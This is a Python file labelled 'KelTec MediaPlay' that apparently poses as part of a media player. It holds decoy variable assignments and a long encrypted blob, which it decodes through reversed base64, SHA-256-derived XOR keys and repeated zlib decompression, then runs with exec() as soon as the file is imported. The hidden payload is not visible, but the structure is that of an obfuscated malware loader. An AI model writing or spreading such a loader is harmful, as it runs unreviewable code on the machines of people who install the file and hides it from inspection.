# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 677430 ^ 648136
_lx1_1 = len("e3c150")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-296240)
_lx3_3 = 640328 * 0
_lx4_4 = 228672 ^ 265320
_K = '24b97067066e2964b07a075bc5287023eec500d9c4de6a77ecbdc1625302a8c2'
_M = 'ySnHUahsO5AZzQ=='
_D = '=A8nrKHpi7qA/50S2A7wTWc9PnWy6otq/0I8QaoKTmcpjA9jeDr7ch8ra7HahK5iRa/Qx9NEjpPo6L/pisd3edrH4Q8mx+vnOEjINArKTly0XjLXMryA30aYKLROs2rZJ8LYF0EO+LNf/nHxib9foPCx/5LnZMXhU+5KgYv3DhI7KcQUuQ5WQMRVKuZkDFkNZldQqzKc6nCcqAwDAlwGHRxS3RBDKOYLfFofBOLyuvn1FSsKYW2yf6sfSGRVBKReuIXKb5PoAAK4cPID50WCj7XsU6K6yLD0nHZLPsaUB9eFYCgaoH2kjp1NcwwlXvO45tBLQPKMiH0FYGD0XLEA+afVo9kCcIF+JZg9cKtwCW2tJ6FBNR4mpFY64DDkyvgyXXjDYf7nd3+Uem+Z/ayZBvlAFmGeuBY6KDnqNK4tQTNpGSftJzFzXaJYBom6gqGAje+MH0VMowwwZH72wTs+uwaTAjqODgBrJFng2qw1O1soUUWvmTM9OeVCvQtWR85wt472wckoXCBHrFeAWGmVjg9jJorJtvqE0UEvB2yr/7Hpyy2I1+J8/FrcOCkk7M5IfyJtoR1eLlhDTqKkQqZnL4xvc8EOn4A1RtRZO7s90lOOmSkMnbxhHn6rDUHln63qrABRZdrv2TJ3XXlc8aax6Zc38YNwQTn7yL1Ot8EnssVJtlJU1RLugLnguzO47hj/jDBhSUvq1cmfCs8Cl+YQE0nQ1kQrHE4ttnASYQbA9Olr/BQhQW98+4r3ZdmwmttJTIgqsg7t9K6faJwj/xNq/TMUGnIu64vN0B2OoVQXBkYWRO5Fy3dZWpXAEYMSSivHJ1AJWtTe7ThB3qUnS7eMnmo6v07X8ebTq76qYNdazQHW0EFnOU7bs+tgQavYXiysF0tD9/WmI9WoHGaif2W3xn30PgIYxcepKvmbCVp2b8teONluP+OzGNqxhISXEzUz54d7z+5WrPb2G/zz5NlUGwsnwCIpoFmmLkelXN3LkYFoXXTWajpUJnYyMPTUmx5hYTGjWbwIAlwiNRHD2C9f633iZhwOoZs1kiB5EpmJK0+rf/Xobk/zGr880+r/0+bynrpD8C+J82zU+r61h1lPfCQgVkcnZ2kl5AmmEiyEQA5P/aJ6bXCGHJFdGhOpYwb0S6k8CrmXtTX+/bvB2OK2Xh92NAmisEM3KbzyfNccqPtZe75g7GTxVY4Emm/jIMvvZm4VzljlGVWiGcV7ZrOIllKqX395MW0Itg/32m0NmO/wyPYRufZRHnkgAV6eWNSBxMceMvMKQssnxxOaxZ+mfDY+JQr1DbDedc0mdiUxAyNI6qN5dupHAPQx8LAOjTEoJgYtG2uzUmwcyshvPc55blHzYiYzUGQ/IBdb6cGhJq9Jsuyf746hTwvG9m4VPQv4M51ZvsJc63LW6PFF1W9cdqzk6rmR0rI/Ih70IygbaYFTn2rhcMsjO7EWonyCiLYR4RW7NNiD1yQjOLHyJY0WKHhoA7GYx4nGCk258IUpb3pVgzHcQ+BuMHiotcwLXQNrjXfnkRV0IQNv1fKmQeWRCGvCjq3lbqKUSu5xGFhs48blDgxjDsSmLorxDj7PvBiFpiP2Vr8eubVU0o1MT0W3fDWWKeRioGzhR6fvh9WD99BKhP3YnmIoT8jtnIZYRZkj+V3uf/pgG92k9rfCtvHrp7XVXN0sQvpeV2ZHXLzFdtAOjsmPHkbLxk0Zx7ABOIFbzzf2tbvsgJTH+RTNotn+IxQ5+aO1mV2fKzjkIp0MkvpZGbVowm21+hIfmTF7wWKTob44824/SA0YzLB/uKJebW8skfyijSQqQVwjh0Vw5vqHJPfXHewQ'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
